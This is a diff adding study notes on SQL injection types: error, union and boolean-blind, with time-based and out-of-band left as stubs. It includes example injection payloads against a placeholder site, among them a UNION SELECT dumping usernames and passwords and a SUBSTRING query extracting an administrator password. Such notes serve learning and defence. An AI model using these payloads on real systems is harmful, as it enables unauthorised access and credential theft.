@@ -137,3 +137,94 @@ IF if_number(p_id) THEN
 END IF;
 ```
 
+# Types of SQL Injection
+
+```mermaid
+graph TD;
+    A["SQL Injection"] --> B["In-Band (Classic)"];
+    A --> C["Inferential (Blind)"];
+    A --> D["Out-of-Band"];
+    B --> E["Error"];
+    B --> F["Union"];
+    C --> G["Boolean"];
+    C --> H["Time"];
+```
+
+1. **In-Band (Classic)** (Easier to exploit)  
+The attacker uses the same communication channel to both
+launch the attack and gather the result of the attack.
+The retrieved data is presented directly in the application
+web page.
+
+    1.1 **Error-based SQL injection**: the attacker forces
+    the database to generate errors that give out information
+    about how the backend is working.
+
+    A single quote can break the query and give out
+    too much information:  
+    Example. Input = `www.random.com/app.php?id'`  
+    Error = "SQL syntax error. Check the manual for MySQL
+    Server version x.x.x.x"
+
+    1.2 **Union-based SQL injection:** Takes advantage
+    of the `UNION` SQL operator.  
+    Example: Input = `www.random.com/app.php?id' UNION SELECT username, password FROM users--`  
+
+    Output:
+    ```
+    carlos
+    afwieusdbv1234
+    administrator
+    aslicnvakqwjnbrf234
+    ```
+
+2. **Inferential (Blind)**  
+SQL injection vulnerability where there is no actual breach
+of data via the web application. The attacker could be
+able to reconstruct the information by sending particular
+requests and observing the behavior of the DB server.
+
+    2.1 **Boolean-based**: The attacker sends TRUE/FALSE
+    SQL payloads to gather information.  
+    Example URL:  
+    `www.random.com/app.php?id=1`  
+    Backend query:  
+    `SELECT title FROM product WHERE id = 1`  
+
+    Payload #1 (False):  
+    `www.random.com/app.php?id=1 AND 1=2`  
+    Resulting backend query:  
+    `SELECT title FROM product WHERE id = 1 AND 1=2`
+    ---> FALSE
+
+    Payload #2 (True):  
+    `www.random.com/app.php?id=1 AND 1=1`  
+    Resulting backend query:
+    ```sql
+    SELECT title FROM product WHERE id = 1 AND 1=1; -- TRUE
+    ```
+
+    **TBL_USERS**
+
+    Administrator / efu3r1tgbk23ufbgu212fih123fv3bg (hash password)
+
+    Payload #3:  
+    `www.random.com/app.php?id=1 AND SUBSTRING((SELECT password FROM tbl_users WHERE username = 'Administrator'), 1, 1) = 's'`
+
+    Resulting backend query:  
+    ```sql
+    SELECT title FROM product WHERE id = 1 AND
+    SUBSTRING((SELECT password FROM tbl_users WHERE username = 'Administrator'), 1, 1) = 's' -- FALSE.
+    -- Nothing is returned and the attacker knows that
+    -- the first letter is NOT 's'. !!! DANGER !!!
+    ```
+
+    > Once you get a `TRUE` result, the attacker can figure out
+    the administrator's password!!
+
+    \* Python script to automate this "brute force" search.
+
+    2.2 **Time-Based**:  (TO DO)
+
+
+3. **Out-of-band**  
